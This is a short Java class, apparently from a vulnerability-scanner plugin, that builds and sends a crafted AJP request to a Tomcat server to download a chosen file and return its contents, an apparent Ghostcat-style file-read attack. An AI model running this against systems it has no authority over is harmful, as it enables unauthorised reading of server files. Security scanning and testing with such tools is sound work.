package com.gbw.scanner.plugins.scripts.web.tomcat;

import com.gbw.scanner.Host;

import java.util.List;

public class GBWTomcatFDownloadAttack {

    private  static String getText(List<GBWAJPResponse> responses){

        StringBuffer sb = new StringBuffer();
        responses.forEach(res->{
            sb.append(new String(res.getData()));
        });

        return sb.toString();
    }

    public static String download(String h,int port,String uri,String fname){

        String res = "";
        GBWScanAJPConfig config = new GBWScanAJPConfig();
        config.setUri(uri);
        config.setFile(fname);
        config.setSSL(false);
        config.setMaxLen(8096);

        GBWAJPClient client = null;

        Host host  = new Host(h,h,port,null,null);

        try{
            client = new GBWAJPClient(host,config);
            GBWAJPMessage message = GBWAJPUtils.createAJPMessage(host,config);
            List<GBWAJPResponse> responses = client.sendAndReceive(message,null);

            if(responses!=null&&responses.size()>0){
                res = GBWAJPUtils.getText(responses);
            }

        }catch (Exception e){

            res = e.getMessage();

        }finally {

            if(client!=null)
                client.close();
        }

        return res;
    }

}
